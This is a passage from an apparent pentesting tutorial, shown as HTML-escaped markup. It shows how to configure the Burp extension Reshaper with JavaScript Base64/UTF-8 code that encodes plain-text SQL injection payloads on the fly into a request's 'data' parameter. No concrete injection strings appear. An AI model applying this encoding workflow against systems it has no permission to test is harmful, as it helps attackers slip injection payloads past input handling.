&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Base64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_utf8_decode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// private method for UTF-8 encoding
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;_utf8_encode&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;/\r\n/g&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;224&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// private method for UTF-8 decoding
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;_utf8_decode&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;224&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;c2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;c2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;c3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;utftext&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(((&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ((&lt;span style=&#34;color:#a6e22e&#34;&gt;c2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;snus&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Base64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;encode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;Reshaper&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;variables&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getGlobalVariable&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;payload_plain_text&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Reshaper&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;runThen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SetVariable&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;snus&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;useMessageValue&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;targetSource&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Global&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;variableName&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;payload_base64&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And to finish up, we&amp;rsquo;ll use the &lt;em&gt;Set Value&lt;/em&gt; action to replace the payload in the &lt;code&gt;data&lt;/code&gt;
parameter that will be sent to the server:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Text&lt;/th&gt;
&lt;th&gt;Source Type Value&lt;/th&gt;
&lt;th&gt;Destination Message Value&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;th&gt;Destination Identifier Placement&lt;/th&gt;
&lt;th&gt;Destination Value Path&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Value&lt;/td&gt;
&lt;td&gt;{{g:payload_base64}}&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;data&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The three steps should be inserted in the following order:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-sqlinjection-three-steps.png&#34; alt=&#34;reshaper-sqlinjection-three-steps&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now we can write our payloads in plain text and let Reshaper convert our
input:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-convertion-to-base64.png&#34; alt=&#34;reshaper-convertion-to-base64&#34;&gt;&lt;/p&gt;
&lt;p&gt;Awesome, we can now on the fly base64 encode data in form-url parameters. This
is certainly useful.&lt;/p&gt;
&lt;h1 id=&#34;scenario-5---using-burp-with-command-line-tools-with-reshaper-run-process&#34;&gt;Scenario 5 - Using Burp with command line tools with Reshaper Run Process&lt;/h1&gt;
&lt;p&gt;Alright, so in the previous example we implemented a base64 encoder in
JavaScript to handle encoding of input to perform a SQL injection attack.&lt;/p&gt;
